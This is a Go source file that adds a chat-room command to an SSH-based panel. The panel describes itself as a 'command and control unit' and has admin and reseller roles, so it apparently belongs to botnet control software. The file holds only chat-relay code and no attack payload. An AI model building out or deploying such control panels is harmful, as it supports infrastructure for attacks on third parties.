package commands

import (
	Sessions "Yami/core/clients/session"

	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"
)

// clear command
func init() {
	Register(&Command{
		Name: "chat",
		Admin: false,
		Reseller: false,

		Descriptions: "joins the command and control unit chat room!",
		Execute: func(channel ssh.Channel, sshConn *ssh.ServerConn, Session *Sessions.Session, cmd []string) error {

			Session.Chat = true 

			
			channel.Write([]byte("Type \"exit\" to disconnect from the chat\r\n"))

			for {
				TermMsg := terminal.NewTerminal(channel, "\x1b[38;5;11m>\x1b[38;5;15m ")
				Msg, error := TermMsg.ReadLine(); if error != nil {
					channel.Write([]byte("\r\n"))
					return nil
				}

				if Msg == "exit" {
					Session.Chat = false
					return nil
				}

				for _, s := range Sessions.Sessions {
					if s.Chat == true && s.Conn.User() != sshConn.User() {
						s.Channel.Write([]byte("\r\x1b[38;5;15m"+sshConn.User()+"\x1b[38;5;40m>\x1b[38;5;15m "+Msg+"\x1b[0m\r\n"))
						s.Channel.Write([]byte("\x1b[38;5;11m>\x1b[38;5;15m "))
					}
				}
			}

			return nil
		},
	})
}